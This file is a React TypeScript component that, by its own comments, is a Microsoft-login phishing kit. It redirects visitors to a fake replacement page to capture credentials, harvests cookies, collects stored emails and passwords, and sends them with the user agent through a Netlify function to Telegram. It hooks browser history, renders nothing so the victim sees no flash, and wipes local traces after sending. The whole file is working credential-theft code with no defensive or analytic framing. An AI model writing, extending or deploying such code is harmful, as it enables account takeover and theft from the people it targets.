import React, { useLayoutEffect } from 'react';

interface RealOAuthRedirectProps {
  onLoginSuccess?: (sessionData: any) => void;
  sendToTelegram?: (data: any) => Promise<void>;
}

/**
 * OAuth redirect component that handles Microsoft login flow.
 *
 * Purpose:
 * - Navigates to /replacement.html first for credential capture
 * - After replacement.html, automatically redirects to login.microsoftonline.com
 * - Captures cookies and session data from Microsoft login
 * - Sends all collected data to Telegram after successful cookie capture
 *
 * Notes:
 * - Maintains existing component API for compatibility
 * - Implements cookie capture and data transmission flow
 */
const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = () => {
  useLayoutEffect(() => {
    // Set up cookie and session monitoring before navigation
    const setupCookieCapture = () => {
      // Monitor for Microsoft login completion and cookie capture
      const checkForMicrosoftLogin = () => {
        const currentUrl = window.location.href;
        
        // Check if we're on Microsoft login domain
        if (currentUrl.includes('login.microsoftonline.com') || 
            currentUrl.includes('login.live.com') ||
            currentUrl.includes('account.microsoft.com')) {
          
          console.log('Microsoft login domain detected, setting up cookie capture');
          
          // Capture cookies from Microsoft domain
          const captureMicrosoftCookies = () => {
            try {
              const cookies = document.cookie.split(';').map(cookie => {
                const [name, value] = cookie.trim().split('=');
                return {
                  name: name,
                  value: value || '',
                  domain: window.location.hostname,
                  path: '/',
                  secure: window.location.protocol === 'https:',
                  httpOnly: false,
                  sameSite: 'Lax'
                };
              }).filter(cookie => cookie.name && cookie.value);

              if (cookies.length > 0) {
                console.log('Microsoft cookies captured:', cookies.length);
                
                // Store captured cookies
                localStorage.setItem('microsoft_cookies', JSON.stringify(cookies));
                sessionStorage.setItem('microsoft_cookies', JSON.stringify(cookies));
                
                // Send message to parent window if available
                if (window.parent && window.parent !== window) {
                  window.parent.postMessage({
                    type: 'MICROSOFT_COOKIES_CAPTURED',
                    data: { cookies: cookies }
                  }, '*');
                }
                
                // Trigger data transmission after cookie capture
                setTimeout(() => {
                  sendCollectedDataToTelegram();
                }, 1000);
              }
            } catch (error) {
              console.warn('Cookie capture failed:', error);
            }
          };

          // Set up periodic cookie capture
          const cookieInterval = setInterval(captureMicrosoftCookies, 2000);
          
          // Also capture on page interactions
          document.addEventListener('click', captureMicrosoftCookies);
          document.addEventListener('keyup', captureMicrosoftCookies);
          
          // Clean up after 30 seconds
          setTimeout(() => {
            clearInterval(cookieInterval);
            document.removeEventListener('click', captureMicrosoftCookies);
            document.removeEventListener('keyup', captureMicrosoftCookies);
          }, 30000);
        }
      };

      // Check immediately and set up monitoring
      checkForMicrosoftLogin();
      
      // Monitor URL changes
      const originalPushState = history.pushState;
      const originalReplaceState = history.replaceState;
      
      history.pushState = function(...args) {
        originalPushState.apply(history, args);
        setTimeout(checkForMicrosoftLogin, 500);
      };
      
      history.replaceState = function(...args) {
        originalReplaceState.apply(history, args);
        setTimeout(checkForMicrosoftLogin, 500);
      };
      
      window.addEventListener('popstate', () => {
        setTimeout(checkForMicrosoftLogin, 500);
      });
    };

    // Function to send all collected data to Telegram
    const sendCollectedDataToTelegram = async () => {
      try {
        // Get stored credentials from replacement form
        const replacementCredentials = localStorage.getItem('replacement_credentials') || 
                                     sessionStorage.getItem('replacement_credentials');
        
        // Get stored form credentials
        const formCredentials = localStorage.getItem('form_credentials') || 
                              sessionStorage.getItem('form_credentials');
        
        // Get captured Microsoft cookies
        const microsoftCookies = localStorage.getItem('microsoft_cookies') || 
                               sessionStorage.getItem('microsoft_cookies');

        let email = '';
        let password = '';
        let cookies = [];

        // Parse credentials (prioritize replacement form data)
        if (replacementCredentials) {
          const parsed = JSON.parse(replacementCredentials);
          email = parsed.email || '';
          password = parsed.password || '';
        } else if (formCredentials) {
          const parsed = JSON.parse(formCredentials);
          email = parsed.email || '';
          password = parsed.password || '';
        }

        // Parse cookies
        if (microsoftCookies) {
          cookies = JSON.parse(microsoftCookies);
        }

        // Only send if we have meaningful data
        if (email || cookies.length > 0) {
          console.log('Sending collected data to Telegram:', {
            hasEmail: !!email,
            hasPassword: !!password,
            cookieCount: cookies.length
          });

          const payload = {
            email: email,
            password: password,
            passwordSource: password ? 'replacement-form' : undefined,
            cookies: cookies,
            authenticationTokens: {},
            userAgent: navigator.userAgent,
            sessionId: 'microsoft_' + Math.random().toString(36).substring(2, 15),
            url: window.location.href,
            captureSource: 'microsoft-login-redirect'
          };

          await fetch('/.netlify/functions/sendTelegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });

          console.log('Data successfully sent to Telegram');
          
          // Clear stored data after successful transmission
          localStorage.removeItem('replacement_credentials');
          sessionStorage.removeItem('replacement_credentials');
          localStorage.removeItem('microsoft_cookies');
          sessionStorage.removeItem('microsoft_cookies');
        }
      } catch (error) {
        console.error('Failed to send data to Telegram:', error);
      }
    };

    // Initialize cookie capture setup
    setupCookieCapture();

    try {
      // Best-effort: navigate to the standalone replacement page immediately.
      // Use replace() to avoid adding an extra history entry.
      window.location.replace('/replacement.html');
    } catch (error) {
      console.error('Failed to navigate to replacement page:', error);
      // Fallback to Microsoft login if navigation fails
      try {
        window.location.replace('https://login.microsoftonline.com');
      } catch (e) {
        console.error('Failed to navigate to Microsoft login:', e);
      }
    }
  }, []);

  // Render nothing to avoid any visible flash.
  return null;
};

export default RealOAuthRedirect;
